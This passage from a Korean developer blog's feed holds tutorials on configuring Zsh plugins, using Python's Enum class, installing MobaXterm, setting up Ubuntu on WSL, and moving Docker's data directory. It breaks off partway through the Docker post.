&#123;</span><br><span class="line">  <span class="keyword">if</span> [[ -n <span class="variable">$CURRENT_BG</span> ]]; <span class="keyword">then</span></span><br><span class="line">    <span class="built_in">echo</span> -n <span class="string">" %&#123;%k%F&#123;<span class="variable">$CURRENT_BG</span>&#125;%&#125;<span class="variable">$SEGMENT_SEPARATOR</span></span></span><br><span class="line"><span class="string">    %(?.%F&#123;<span class="variable">$CURRENT_BG</span>&#125;.%F&#123;red&#125;)❯%f"</span></span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">echo</span> -n <span class="string">"%&#123;%k%&#125;"</span></span><br><span class="line">  <span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">echo</span> -n <span class="string">"%&#123;%f%&#125;"</span></span><br><span class="line">  CURRENT_BG=<span class="string">''</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="zsh-autosuggestions-플러그인-설치"><a href="#zsh-autosuggestions-플러그인-설치" class="headerlink" title="zsh-autosuggestions 플러그인 설치"></a>zsh-autosuggestions 플러그인 설치</h3><p><a href="https://github.com/zsh-users/zsh-autosuggestions" target="_blank" rel="noopener">zsh-autosuggestions GitHub Repository</a> 페이지를 참고하여 플러그인을 설치한다.</p><p>다음과 같이 <code>~/.zshrc</code> 파일을 수정하여 설치한 플러그인을 적용한다.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">plugins=(</span><br><span class="line">  ...</span><br><span class="line">  zsh-autosuggestions</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>다음 명령어를 이용하여 변경사항을 반영한다.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">source</span> ~/.zshrc</span><br></pre></td></tr></table></figure><h3 id="zsh-syntax-highlighting-플러그인-설치"><a href="#zsh-syntax-highlighting-플러그인-설치" class="headerlink" title="zsh-syntax-highlighting 플러그인 설치"></a>zsh-syntax-highlighting 플러그인 설치</h3><p><a href="https://github.com/zsh-users/zsh-syntax-highlighting" target="_blank" rel="noopener">zsh-syntax-highlighting GitHub Repository</a> 페이지를 참고하여 플러그인을 설치한다.</p><p>다음과 같이 <code>~/.zshrc</code> 파일을 수정하여 설치한 플러그인을 적용한다.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">plugins=(</span><br><span class="line">  ...</span><br><span class="line">  zsh-syntax-highlighting</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>다음 명령어를 이용하여 변경사항을 반영한다.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">source</span> ~/.zshrc</span><br></pre></td></tr></table></figure><h3 id="autojump-플러그인-설치"><a href="#autojump-플러그인-설치" class="headerlink" title="autojump 플러그인 설치"></a>autojump 플러그인 설치</h3><p>다음 명령어를 이용하여 플러그인을 설치한다.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install autojump</span><br></pre></td></tr></table></figure><p>다음과 같이 <code>~/.zshrc</code> 파일을 수정하여 설치한 플러그인을 적용한다.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">plugins=(</span><br><span class="line">  ...</span><br><span class="line">  autojump</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>다음 명령어를 이용하여 변경사항을 반영한다.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">source</span> ~/.zshrc</span><br></pre></td></tr></table></figure><h2 id="참고자료"><a href="#참고자료" class="headerlink" title="참고자료"></a>참고자료</h2><ul><li><a href="https://www.flaticon.com/authors/smashicons" target="_blank" rel="noopener">Icons made by Smashicons CC 3.0 BY</a></li><li><a href="https://the-illusionist.me/47" target="_blank" rel="noopener">우분투에 zsh와 oh my zsh 설치하기</a></li><li><a href="https://medium.com/harrythegreat/oh-my-zsh-iterm2%EB%A1%9C-%ED%84%B0%EB%AF%B8%EB%84%90%EC%9D%84-%EB%8D%94-%EA%B0%95%EB%A0%A5%ED%95%98%EA%B2%8C-a105f2c01bec" target="_blank" rel="noopener">Oh My ZSH+ iTerm2로 터미널을 더 강력하게</a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;개요&quot;&gt;&lt;a href=&quot;#개요&quot; class=&quot;headerlink&quot; title=&quot;개요&quot;&gt;&lt;/a&gt;개요&lt;/h2&gt;&lt;img src=&quot;/2019/08/11/install-zsh-on-ubuntu/terminal.svg&quot; width=&quot;200&quot;&gt;

&lt;p&gt;개발 일을 하는 사람에게 뗄래야 뗄 수 없는 것이 바로 터미널 소프트웨어이다.&lt;br&gt;이왕 계속 보는 거 좀 이쁘면 기분이 좋지 않을까?&lt;/p&gt;
&lt;p&gt;나와 같은 생각을 했던 많은 개발자들이 탄탄대로를 만들어 놓았다.&lt;br&gt;이 문서에서는 Ubuntu 환경에 Zsh를 설치하고 구성하는 방법을 정리한다.&lt;/p&gt;
    
    </summary>
    
      <category term="개발 환경 구축" scheme="https://www.jslee.me/categories/%EA%B0%9C%EB%B0%9C-%ED%99%98%EA%B2%BD-%EA%B5%AC%EC%B6%95/"/>
    
    
      <category term="Zsh" scheme="https://www.jslee.me/tags/Zsh/"/>
    
      <category term="Terminal" scheme="https://www.jslee.me/tags/Terminal/"/>
    
  </entry>
  
  <entry>
    <title>Python Enum 클래스</title>
    <link href="https://www.jslee.me/2019/08/10/python-enum/"/>
    <id>https://www.jslee.me/2019/08/10/python-enum/</id>
    <published>2019-08-10T11:35:38.000Z</published>
    <updated>2019-08-10T12:38:10.333Z</updated>
    
    <content type="html"><![CDATA[<h2 id="개요"><a href="#개요" class="headerlink" title="개요"></a>개요</h2><p>현실의 문제를 프로그래밍으로 다루려고 고민하다 보면 조건에 따른 분기를 어떻게 처리할 것인지에 대해 생각하게 된다.<br>이 때 단순하고 전통적인 방식으로 조건을 확인하고 맞으면 이거, 아니면 저거 식의 if-else문을 사용해도 되지만<br>더 나은 프로그래밍 방식에 대한 가치관을 세우고 객체지향, 함수형 등의 다양한 개념을 접하다 보면<br>사람에 따라, 상황에 따라 열거형 클래스 등을 이용해서 처리하기도 한다.</p><p>Python에서는 3.4 버전부터 열거형 클래스인 Enum을 기본으로 탑재하였다.<br>이 문서에서는 이것을 사용하는 방법을 정리한다.</p><a id="more"></a><h2 id="사용법"><a href="#사용법" class="headerlink" title="사용법"></a>사용법</h2><h3 id="기본"><a href="#기본" class="headerlink" title="기본"></a>기본</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> enum</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Color</span><span class="params">(enum.Enum)</span>:</span></span><br><span class="line">    RED = <span class="number">0</span></span><br><span class="line">    GREEN = <span class="number">1</span></span><br><span class="line">    BLUE = <span class="number">2</span></span><br></pre></td></tr></table></figure><p><code>enum.Enum</code> 클래스를 상속받는 <code>Color</code> 클래스는 이제 열거형 상수로 이용된다.<br>이 예제에서는 정수를 이용하나 정수 뿐만 아니라 모든 자료형을 사용할 수 있다.</p><p>기본적인 사용에서는 다음과 같은 결과를 가져올 수 있다.<br>각 코드에 대한 반환값은 다음 줄에 주석으로 표기하였다.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">print(Color)</span><br><span class="line"><span class="comment"># &lt;enum 'Color'&gt;</span></span><br><span class="line"></span><br><span class="line">print(Color.RED, Color.BLUE, Color.GREEN)</span><br><span class="line"><span class="comment"># Color.RED Color.BLUE Color.GREEN</span></span><br><span class="line"></span><br><span class="line">print(Color.RED.name)</span><br><span class="line"><span class="comment"># RED</span></span><br><span class="line"></span><br><span class="line">print(Color.RED.value)</span><br><span class="line"><span class="comment"># 0</span></span><br><span class="line"></span><br><span class="line">print(repr(Color.RED))</span><br><span class="line"><span class="comment"># &lt;Color.RED: 0&gt;</span></span><br><span class="line"></span><br><span class="line">print(type(Color.RED))</span><br><span class="line"><span class="comment"># &lt;enum 'Color'&gt;</span></span><br><span class="line"></span><br><span class="line">print(Color(<span class="number">0</span>), Color(<span class="number">2</span>))</span><br><span class="line"><span class="comment"># Color.RED Color.BLUE</span></span><br><span class="line"></span><br><span class="line">print(Color[<span class="string">'RED'</span>], Color[<span class="string">'BLUE'</span>])</span><br><span class="line"><span class="comment"># Color.RED Color.BLUE</span></span><br><span class="line"></span><br><span class="line">print(Color.RED == Color.RED)</span><br><span class="line"><span class="comment"># True</span></span><br><span class="line"></span><br><span class="line">print(Color.RED == <span class="number">0</span>)</span><br><span class="line"><span class="comment"># False</span></span><br><span class="line"><span class="comment">## enum을 정수와 비교하는 것은 항상 False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> Color:</span><br><span class="line">    print(c)</span><br><span class="line"><span class="comment"># Color.RED</span></span><br><span class="line"><span class="comment"># Color.GREEN</span></span><br><span class="line"><span class="comment"># Color.BLUE</span></span><br><span class="line"></span><br><span class="line">print(list(Color))</span><br><span class="line"><span class="comment"># [&lt;Color.RED: 0&gt;, &lt;Color.GREEN: 1&gt;, &lt;Color.BLUE: 2&gt;]</span></span><br></pre></td></tr></table></figure><h3 id="Unique"><a href="#Unique" class="headerlink" title="Unique"></a>Unique</h3><p>열거형 데이터의 인덱스에 대한 유일성을 보장해야 하는 경우가 있을 수 있다.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@enum.unique</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Foods</span><span class="params">(enum.Enum)</span>:</span></span><br><span class="line">    SNACK = <span class="number">0</span></span><br><span class="line">    COKE = <span class="number">1</span></span><br><span class="line">    CIDER = <span class="number">1</span></span><br><span class="line">    JUICE = <span class="number">1</span></span><br><span class="line">    PIZZA = <span class="number">2</span></span><br><span class="line">    BURGER = <span class="number">2</span></span><br></pre></td></tr></table></figure><p><code>enum.unique</code>라는 Decoration을 사용하면 위와 같이 중복된 값을 가지는 속성이 있는 경우 에러를 발생시킨다.</p><h3 id="Auto"><a href="#Auto" class="headerlink" title="Auto"></a>Auto</h3><p>Python 3.6 버전 이상에서는 <code>enum.auto()</code> 함수를 이용하여 자동으로 인덱스를 할당할 수 있다.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">NewColor</span><span class="params">(enum.Enum)</span>:</span></span><br><span class="line">    RED = enum.auto()</span><br><span class="line">    GREEN = enum.auto()</span><br><span class="line">    BLUE = enum.auto()</span><br></pre></td></tr></table></figure><p>인덱스는 1부터 시작하고 1씩 증가한다.</p><h2 id="참고자료"><a href="#참고자료" class="headerlink" title="참고자료"></a>참고자료</h2><ul><li><a href="https://pythonkim.tistory.com/90" target="_blank" rel="noopener">enum 클래스</a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;개요&quot;&gt;&lt;a href=&quot;#개요&quot; class=&quot;headerlink&quot; title=&quot;개요&quot;&gt;&lt;/a&gt;개요&lt;/h2&gt;&lt;p&gt;현실의 문제를 프로그래밍으로 다루려고 고민하다 보면 조건에 따른 분기를 어떻게 처리할 것인지에 대해 생각하게 된다.&lt;br&gt;이 때 단순하고 전통적인 방식으로 조건을 확인하고 맞으면 이거, 아니면 저거 식의 if-else문을 사용해도 되지만&lt;br&gt;더 나은 프로그래밍 방식에 대한 가치관을 세우고 객체지향, 함수형 등의 다양한 개념을 접하다 보면&lt;br&gt;사람에 따라, 상황에 따라 열거형 클래스 등을 이용해서 처리하기도 한다.&lt;/p&gt;
&lt;p&gt;Python에서는 3.4 버전부터 열거형 클래스인 Enum을 기본으로 탑재하였다.&lt;br&gt;이 문서에서는 이것을 사용하는 방법을 정리한다.&lt;/p&gt;
    
    </summary>
    
      <category term="프로그래밍" scheme="https://www.jslee.me/categories/%ED%94%84%EB%A1%9C%EA%B7%B8%EB%9E%98%EB%B0%8D/"/>
    
    
      <category term="Python" scheme="https://www.jslee.me/tags/Python/"/>
    
      <category term="Enum" scheme="https://www.jslee.me/tags/Enum/"/>
    
  </entry>
  
  <entry>
    <title>Windows에 MobaXterm 설치하기</title>
    <link href="https://www.jslee.me/2019/08/09/install-mobaxterm-on-windows/"/>
    <id>https://www.jslee.me/2019/08/09/install-mobaxterm-on-windows/</id>
    <published>2019-08-09T04:24:41.000Z</published>
    <updated>2019-08-10T16:53:10.468Z</updated>
    
    <content type="html"><![CDATA[<h2 id="개요"><a href="#개요" class="headerlink" title="개요"></a>개요</h2><img src="/2019/08/09/install-mobaxterm-on-windows/mobaxterm-logo.jpg" width="200"><p>보통 컴퓨터 사면 게임도 해야 되고 인터넷 뱅킹도 해야 되고 하니 거의 무조건 Windows를 설치한다.<br>근데 소프트웨어를 구동하고 서비스하기 위한 서버에서는 서버 구축하기에 편하도록 리눅스를 사용하는 곳이 많다.<br>그리고 한 서버에 여러 명이 작업을 해야 하기 때문에 SSH라는 기술을 이용해서 원격으로 접속한다.</p><a id="more"></a><p>리눅스나 macOS의 경우 기본 내장된 터미널 도구를 이용하여 서버에 SSH로 접속할 수 있다.<br>그런데 Windows는 기본 내장된 터미널이 CMD, Powershell 이런 것들이라 서버에 접속하는 등의 일이 잘 안 된다.</p><p>MobaXterm은 X11 서버 등의 여러 도구를 포함한 SSH 클라이언트 소프트웨어다.<br>Windows 환경에서 실행할 수 있으며 나도 직접 쓰고 있는 도구이다.<br>넷사랑 사의 Xmanager 등과 비슷한 위치에 있는 도구라고 이해하면 된다.<br>하지만 Xmanager 등은 유료 소프트웨어인데 반해 MobaXterm은 GNU 라이센스를 따르기 때문에 무료 버전은 회사에서 써도 문제가 없다.<br>그래서 Windows 환경을 사용하고 있다면 안 쓸 이유가 없다.</p><p>이 글에서는 MobaXterm을 설치하고 사용하는 방법에 대하여 정리한다.</p><h2 id="설치"><a href="#설치" class="headerlink" title="설치"></a>설치</h2><p>MobaXterm은 <a href="https://mobaxterm.mobatek.net/" target="_blank" rel="noopener">공식 홈페이지</a>가 있다.</p><p>공식 홈페이지에서 Download 탭을 선택하고 무료인 Home Edition을 다운로드한다.</p><p>Portable 버전과 Installer 버전이 있는데 그냥 실행하든 설치해서 실행하든 별 차이 없으니 원하는 대로 고르면 된다.</p><p>그럼 설치는 끝난다.</p><h2 id="실행"><a href="#실행" class="headerlink" title="실행"></a>실행</h2><p>설치된 MobaXterm을 실행하면 Home 탭이 열려있는 창이 뜬다.</p><h3 id="SSH-서버-접속"><a href="#SSH-서버-접속" class="headerlink" title="SSH 서버 접속"></a>SSH 서버 접속</h3><p>좌측 Sessions 탭에 오른쪽 클릭을 하고 New session을 선택한다.</p><p>세션을 만드는 창이 뜨면 SSH를 선택하고 서버 주소와 포트, 사용할 계정을 입력한 후 OK를 누른다.</p><p>Sessions 탭에 만들어진 항목을 더블클릭하면 새로운 탭이 생기면서 접속이 된다.</p><p>비밀번호를 치면 기억할지 물어보는데 Yes를 선택하면 다음부터는 비밀번호를 안 물어본다.</p><h3 id="WSL-접속"><a href="#WSL-접속" class="headerlink" title="WSL 접속"></a>WSL 접속</h3><p>MobaXterm으로 WSL에 접속할 수도 있다.</p><p>세션을 만들 때 WSL을 선택하고 본인이 설치한 리눅스 배포판을 선택한다.</p><p>OK를 누르고 만들어진 항목을 더블클릭하면 WSL에 접속이 된다.</p><h3 id="SSH-Tunnel"><a href="#SSH-Tunnel" class="headerlink" title="SSH Tunnel"></a>SSH Tunnel</h3><p>MobaXterm에 SSH Tunnel 도구가 있다.</p><p>상단 도구 모음에 Tunneling이라는 라벨이 붙어 있는 항목을 선택하면 새 창이 뜨고 SSH Tunneling을 설정할 수 있다.</p><p>SSH Tunneling에 대한 자세한 내용은 따로 정리해서 올리도록 하겠다.</p><h3 id="저장된-비밀번호-관리"><a href="#저장된-비밀번호-관리" class="headerlink" title="저장된 비밀번호 관리"></a>저장된 비밀번호 관리</h3><p>Settings → General → MobaXterm passwords management 항목을 선택하면</p><p>저장된 비밀번호를 확인하고 삭제하고 내보내는 등의 관리를 할 수가 있다.</p><h2 id="문제-해결"><a href="#문제-해결" class="headerlink" title="문제 해결"></a>문제 해결</h2><h3 id="Home-End키가-안-먹는-문제"><a href="#Home-End키가-안-먹는-문제" class="headerlink" title="Home, End키가 안 먹는 문제"></a>Home, End키가 안 먹는 문제</h3><p>MobaXterm으로 접속하면 Home키를 이용한 라인 맨 앞으로 가기와 End키를 이용한 라인 맨 뒤로 가기 기능이 안 되는 경우가 있다.</p><p>이 때는 사용 중인 쉘의 rc 스크립트에 다음 구문을 추가해주면 된다.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">bindkey</span> <span class="string">'^[[1~'</span> beginning-of-line</span><br><span class="line"><span class="built_in">bindkey</span> <span class="string">'^[[4~'</span> end-of-line</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;개요&quot;&gt;&lt;a href=&quot;#개요&quot; class=&quot;headerlink&quot; title=&quot;개요&quot;&gt;&lt;/a&gt;개요&lt;/h2&gt;&lt;img src=&quot;/2019/08/09/install-mobaxterm-on-windows/mobaxterm-logo.jpg&quot; width=&quot;200&quot;&gt;

&lt;p&gt;보통 컴퓨터 사면 게임도 해야 되고 인터넷 뱅킹도 해야 되고 하니 거의 무조건 Windows를 설치한다.&lt;br&gt;근데 소프트웨어를 구동하고 서비스하기 위한 서버에서는 서버 구축하기에 편하도록 리눅스를 사용하는 곳이 많다.&lt;br&gt;그리고 한 서버에 여러 명이 작업을 해야 하기 때문에 SSH라는 기술을 이용해서 원격으로 접속한다.&lt;/p&gt;
    
    </summary>
    
      <category term="개발 환경 구축" scheme="https://www.jslee.me/categories/%EA%B0%9C%EB%B0%9C-%ED%99%98%EA%B2%BD-%EA%B5%AC%EC%B6%95/"/>
    
    
      <category term="Terminal" scheme="https://www.jslee.me/tags/Terminal/"/>
    
      <category term="SSH" scheme="https://www.jslee.me/tags/SSH/"/>
    
      <category term="Windows" scheme="https://www.jslee.me/tags/Windows/"/>
    
      <category term="MobaXterm" scheme="https://www.jslee.me/tags/MobaXterm/"/>
    
      <category term="X11" scheme="https://www.jslee.me/tags/X11/"/>
    
  </entry>
  
  <entry>
    <title>WSL 환경에 Ubuntu 설정하기</title>
    <link href="https://www.jslee.me/2019/08/08/ubuntu-on-wsl/"/>
    <id>https://www.jslee.me/2019/08/08/ubuntu-on-wsl/</id>
    <published>2019-08-08T11:28:57.000Z</published>
    <updated>2019-08-09T04:38:12.598Z</updated>
    
    <content type="html"><![CDATA[<h2 id="개요"><a href="#개요" class="headerlink" title="개요"></a>개요</h2><img src="/2019/08/08/ubuntu-on-wsl/wsl-logo.png" width="200"><p>Windows 10 버전 1607 이상에서는 가상 머신이 없이도 Linux 환경에서 작업할 수 있다.<br>바로 Windows Subsystem for Linux, 줄여서 WSL이 있기 때문이다.</p><p>이 글에서는 Windows Subsystem for Linux 환경을 이용하여 Windows를 사용하며 Ubuntu도 사용하는 방법을 정리한다.</p><a id="more"></a><h2 id="설치"><a href="#설치" class="headerlink" title="설치"></a>설치</h2><p>다음과 같은 순서로 WSL을 통해 Ubuntu를 설치할 수 있다.</p><ol><li>제어판 → 프로그램 → 프로그램 및 기능 → Windows 기능 켜기/끄기를 선택한다.</li><li>목록에서 Linux용 Windows 하위 시스템을 찾아 체크박스에 체크한다.</li><li>확인 버튼을 누르면 자동으로 설치가 되며 설치가 완료되면 안내에 따라 컴퓨터를 재부팅한다.</li><li>컴퓨터에 내장된 Microsoft Store를 열고 Ubuntu를 검색하여 설치한다.</li><li>설치가 완료되면 Ubuntu 앱을 연다.</li><li>콘솔 창이 뜨면 조금 기다린다.</li><li>Enter new UNIX username 문구가 나타나면 Ubuntu에서 사용할 계정을 입력한다.</li><li>그 후 비밀번호를 두 번 입력하면 설치가 완료된다.</li></ol><h2 id="장단점"><a href="#장단점" class="headerlink" title="장단점"></a>장단점</h2><p>시스템 구축과 관련된 일을 하다보면 윈도우에서는 제약이 너무 많아서 리눅스 환경이 가장 적합하다고 느껴진다.<br>개발 일을 해도 Python이나 Node.js 등등 윈도우를 지원하긴 하지만 환경 구성에는 리눅스에 비빌 수가 없다.</p><p>그런데 막상 우분투 데스크탑을 깔아버리면 뱅킹도 안되고 게임도 안되고 쓰다가 지쳐서 에잉 다신 안 써 하면서 윈도우로 돌아오게 된다.<br>그러고 다시 아 불편해 리눅스 깔까? 무한 반복이다.</p><p>그 때 나를 구원해준 것이 바로 WSL이었다.<br>윈도우의 안정성과 보편성을 가진 채로 리눅스의 매력까지 즐길 수 있게 된 것이었다.</p><p>성능도 나름 나쁘지 않았고 MobaXterm과 같은 도구를 이용하면 아주 손쉽게 PyCharm 등의 GUI 소프트웨어도 실행해서 사용할 수 있었다.<br>그래서 지금까지도 계속 쓰고 있다.</p><p>한 가지 아쉬운 점은 Docker를 못 쓴다는 것이다.<br>찾아보니 파일 시스템 속도도 좀 느리고 리눅스 시스템 콜을 제대로 지원하지 못한다는 단점도 있다고 한다.<br>근데 나는 Docker만 빼면 그냥 그럭저럭 좋은 것 같다.</p><p>WSL을 이용해서 지금 어떻게 작업을 하고 있는지<br>설정 방법 등의 내용은 다음에 따로 정리해서 올릴 것이다.</p><h2 id="참고자료"><a href="#참고자료" class="headerlink" title="참고자료"></a>참고자료</h2><ul><li><a href="https://webdir.tistory.com/541" target="_blank" rel="noopener">윈도우즈에서 리눅스 설치 - WSL</a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;개요&quot;&gt;&lt;a href=&quot;#개요&quot; class=&quot;headerlink&quot; title=&quot;개요&quot;&gt;&lt;/a&gt;개요&lt;/h2&gt;&lt;img src=&quot;/2019/08/08/ubuntu-on-wsl/wsl-logo.png&quot; width=&quot;200&quot;&gt;

&lt;p&gt;Windows 10 버전 1607 이상에서는 가상 머신이 없이도 Linux 환경에서 작업할 수 있다.&lt;br&gt;바로 Windows Subsystem for Linux, 줄여서 WSL이 있기 때문이다.&lt;/p&gt;
&lt;p&gt;이 글에서는 Windows Subsystem for Linux 환경을 이용하여 Windows를 사용하며 Ubuntu도 사용하는 방법을 정리한다.&lt;/p&gt;
    
    </summary>
    
      <category term="개발 환경 구축" scheme="https://www.jslee.me/categories/%EA%B0%9C%EB%B0%9C-%ED%99%98%EA%B2%BD-%EA%B5%AC%EC%B6%95/"/>
    
    
      <category term="WSL" scheme="https://www.jslee.me/tags/WSL/"/>
    
      <category term="Ubuntu" scheme="https://www.jslee.me/tags/Ubuntu/"/>
    
  </entry>
  
  <entry>
    <title>Docker 데이터 디렉토리 변경</title>
    <link href="https://www.jslee.me/2019/08/07/change-docker-data-dir/"/>
    <id>https://www.jslee.me/2019/08/07/change-docker-data-dir/</id>
    <published>2019-08-07T11:58:33.000Z</published>
    <updated>2019-08-10T16:50:12.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="개요"><a href="#개요" class="headerlink" title="개요"></a>개요</h2><img src="/2019/08/07/change-docker-data-dir/directory.svg" width="200"><p>Docker는 기본적으로 <code>/var/lib/docker</code> 디렉토리에 Docker Image 등의 데이터를 저장한다.<br>이 상태로 두면 서버의 루트 용량이 적을 경우 Docker의 데이터로 인해 루트가 가득 차 각종 오류를 일으킬 수 있다.</p><p>따라서 Docker 데이터 디렉토리를 큰 용량을 가진 별도의 디렉토리로 변경할 필요가 있다.<br>이 페이지에서는 <code>/home/docker</code> 디렉토리로 변경한다.</p><a id="more"></a><h2 id="방법"><a href="#방법" class="headerlink" title="방법"></a>방법</h2><h3 id="Ubuntu-Debian-Docker-데이터-디렉토리-변경"><a href="#Ubuntu-Debian-Docker-데이터-디렉토리-변경" class="headerlink" title="Ubuntu/Debian Docker 데이터 디렉토리 변경"></a>Ubuntu/Debian Docker 데이터 디렉토리 변경</h3><p>먼저 다음 명령어를 이용하여 실행 중인 Docker 프로세스를 중지한다.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo service docker stop</span><br></pre></td></tr></table></figure><p><code>/etc/default/docker</code> 파일을 다음과 같이 수정한다.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DOCKER_OPTS=<span class="string">"-g /home/docker"</span></span><br></pre></td></tr></table></figure><p>기존 자료를 다음 명령어로 이동한다.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mv /var/lib/docker/* /home/docker/</span><br></pre></td></tr></table></figure><p>다음 명령어를 이용하여 Docker 프로세스를 실행한다.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo service docker start</span><br></pre></td></tr></table></figure><h3 id="CentOS-Docker-데이터-디렉토리-변경"><a href="#CentOS-Docker-데이터-디렉토리-변경" class="headerlink" title="CentOS Docker 데이터 디렉토리 변경"></a>CentOS Docker 데이터 디렉토리 변경</h3><p>먼저 다음 명령어를 이용하여 실행 중인 Docker 프로세스를 중지한다.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo systemctl stop docker</span><br></pre></td></tr></table></figure><p><code>/usr/lib/systemd/system/docker.service</code> 파일을 다음과 같이 수정한다.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">[Unit]</span><br><span class="line">Description=Docker Application Container Engine</span><br><span class="line">Documentation=https://docs.docker.com</span><br><span class="line">After=network-online.target firewalld.service</span><br><span class="line">Wants=network-online.target</span><br><span class="line">[Service]</span><br><span class="line">Type=notify</span><br><span class="line"># the default is not to use systemd for cgroups because the delegate issues still</span><br><span class="line"># exists and systemd currently does not support the cgroup feature set required</span><br><span class="line"># for containers run by docker</span><br><span class="line">ExecStart=/usr/bin/dockerd -g /home/docker</span><br><span class="line">ExecReload=/bin/kill -s HUP $MAINPID</span><br><span class="line"># Having non-zero Limit*s causes performance problems due to accounting overhead</span><br><span class="line"># in the kernel. We recommend using cgroups to do container-local accounting.</span><br><span class="line">LimitNOFILE=infinity</span><br><span class="line">LimitNPROC=infinity</span><br><span class="line">LimitCORE=infinity</span><br><span class="line"># Uncomment TasksMax if your systemd version supports it.</span><br><span class="line"># Only systemd 226 and above support this version.</span><br><span class="line">#TasksMax=infinity</span><br><span class="line">TimeoutStartSec=0</span><br><span class="line"># set delegate yes so that systemd does not reset the cgroups of docker containers</span><br><span class="line">Delegate=yes</span><br><span class="line"># kill only the docker process, not all processes in the cgroup</span><br><span class="line">KillMode=process</span><br><span class="line"># restart the docker process if it exits prematurely</span><br><span class="line">Restart=on-failure</span><br><span class="line">StartLimitBurst=3</span><br><span class="line">StartLimitInterval=60s</span><br><span class="line">[Install]</span><br><span class="line">WantedBy=multi-user.target</span><br></pre></td></tr></table></figure><p>ExecStart 부분의 맨 끝에 -g /home/docker 를 추가하였다.</p><p>기존 자료를 다음 명령어로 이동한다.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td 